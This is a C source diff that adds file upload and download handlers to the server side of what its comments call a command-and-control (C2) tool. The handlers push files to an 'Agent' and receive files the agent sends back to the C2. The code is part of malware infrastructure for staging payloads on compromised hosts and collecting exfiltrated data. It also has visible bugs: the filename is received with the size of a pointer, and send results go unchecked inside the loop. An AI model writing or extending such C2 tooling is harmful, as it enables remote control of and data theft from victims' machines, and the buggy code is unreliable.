@@ -246,3 +246,115 @@ void HandleStopProcess(char *cmd, int client_socket){
 
     return;
 }
+
+
+// Server will send data , Agent will receive
+// GetFileFromC2() will be called in Agent/Client
+int UploadFile(char *cmd,int client_socket, char * filename, char * FullWindowsPath) {
+
+
+    ssize_t sent_bytes = 0;
+    ssize_t bytes_received = 0;
+    
+    sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
+    if (sent_bytes == -1){
+        printf("[x] send() failed\n");
+        return -1;
+    }
+
+
+    // Check if file exists
+    FILE* file = fopen(filename, "rb");
+    if (!file) {
+        perror("Failed to open file");
+        return -1;
+    }
+
+    // Get file size
+    fseek(file, 0, SEEK_END);
+    long file_size = ftell(file);
+    fseek(file, 0, SEEK_SET);
+
+    printf("[+] File size is %lu\n",file_size);
+    // send file size
+
+    sent_bytes = send(client_socket,&file_size,(size_t) sizeof(file_size),0);
+    if (sent_bytes == -1){
+        printf("[x] send() failed\n");
+        return -1;
+    }
+
+    //send file data
+
+    char FileBuf[BUFFER_SIZE];
+    long total_sent = 0;
+    int bytes_read = 0;
+
+    while ((bytes_read = fread(FileBuf, 1, BUFFER_SIZE, file)) > 0) {
+        send(client_socket, FileBuf, bytes_read, 0);
+        total_sent += bytes_read;
+
+        // Show progress
+        printf("Sent: %ld/%ld bytes (%.2f%%)\r",
+            total_sent, file_size,
+            (double)total_sent / file_size * 100);
+        fflush(stdout);
+    }
+    
+    printf("\nFile sent successfully!\n");
+
+    fclose(file);
+
+
+
+    return 0;
+}
+
+
+// Server will receive data , Agent will send
+// UploadFileToC2() will be called from Agent/Client
+int DownloadFile(char *cmd,int client_socket, char * filename) {
+
+    // Receive filename
+    //char filename[256];
+    recv(client_socket, filename, sizeof(filename), 0);
+    printf("Receiving file: %s\n", filename);
+
+    // Receive file size
+    long file_size = 0;
+    recv(client_socket, &file_size, sizeof(file_size), 0);
+    printf("File size: %ld bytes\n", file_size);
+
+    // Open file for writing
+    FILE* file = fopen(filename, "wb");
+    if (!file) {
+        perror("Failed to open file");
+        
+        exit(EXIT_FAILURE);
+    }
+
+    // Receive file data
+    char buffer[BUFFER_SIZE];
+    long total_received = 0;
+    int bytes_received;
+
+    while (total_received < file_size) {
+        bytes_received = recv(client_socket, buffer, BUFFER_SIZE, 0);
+        if (bytes_received <= 0) { break; }
+
+        fwrite(buffer, 1, bytes_received, file);
+        total_received += bytes_received;
+
+        // Show progress
+        printf("Received: %ld/%ld bytes (%.2f%%)\r",
+            total_received, file_size,
+            (double)total_received / file_size * 100);
+        fflush(stdout);
+    }
+
+    printf("\nFile received successfully!\n");
+
+    fclose(file);
+
+    return 0;
+}
